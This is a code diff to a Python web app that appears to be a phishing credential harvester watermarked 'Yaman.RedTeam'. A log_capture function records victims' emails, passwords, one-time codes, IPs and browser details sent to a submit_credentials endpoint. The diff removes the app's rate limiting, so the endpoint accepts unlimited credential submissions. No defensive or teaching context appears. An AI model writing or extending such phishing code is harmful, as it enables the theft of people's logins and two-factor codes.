@@ -9,8 +9,6 @@ from datetime import datetime
 from pathlib import Path
 import json
 import hashlib
-from collections import defaultdict
-import time
 
 # ── Watermark ──────────────────────────────────────────────
 AUTHOR = "Yaman.RedTeam"
@@ -77,36 +75,10 @@ def init_db():
             attempt_number INTEGER
         )
     ''')
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS rate_limits (
-            ip_address TEXT PRIMARY KEY,
-            attempt_count INTEGER,
-            last_attempt REAL,
-            locked BOOLEAN
-        )
-    ''')
     conn.commit()
     conn.close()
 
 init_db()
-
-# Rate limiting config
-MAX_ATTEMPTS = 5
-LOCKOUT_DURATION = 300  # 5 minutes
-rate_limit_store = defaultdict(lambda: {"count": 0, "last_time": 0})
-
-def check_rate_limit(ip: str) -> bool:
-    """Check if IP is rate limited"""
-    current_time = time.time()
-    record = rate_limit_store[ip]
-
-    if current_time - record["last_time"] > LOCKOUT_DURATION:
-        record["count"] = 0
-
-    record["last_time"] = current_time
-    record["count"] += 1
-
-    return record["count"] > MAX_ATTEMPTS
 
 def log_capture(service: str, email: str, password: str, otp: str, honeypot: str, ip: str, ua: str, referer: str):
     """Log phishing attempt"""
@@ -547,10 +519,6 @@ async def submit_credentials(request: Request):
     data = await request.json()
 
     ip = get_client_ip(request)
-
-    # Check rate limiting
-    if check_rate_limit(ip):
-        raise HTTPException(status_code=429, detail="Too many attempts. Try again later.")
 
     service = data.get("service", "generic").strip()
     email = data.get("email", "").strip()
